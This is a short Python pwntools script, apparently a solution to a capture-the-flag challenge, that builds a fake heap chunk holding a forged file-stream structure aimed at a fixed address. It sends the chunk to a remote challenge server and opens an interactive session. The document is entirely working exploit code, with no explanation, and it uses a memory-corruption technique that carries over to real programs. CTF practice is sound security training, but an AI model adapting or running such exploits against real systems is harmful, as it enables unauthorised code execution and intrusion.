from pwn import *
context.arch = 'amd64'

owo_addr = 0x404070

fake_chunk = flat(
    b'AAAAAAAA', b'AAAAAAAA',
    0, 0x1e1,
    0xfbad0000, 0,
    0, 0,
    owo_addr, 0,
    0, owo_addr,
    owo_addr + 0x100, 0,
    0, 0,
    0, 0,
    0,
)

r = remote('edu-ctf.zoolab.org', 10009)
r.send(fake_chunk)
r.send(b'BBBBBBBBBBBBBBBB')
r.interactive()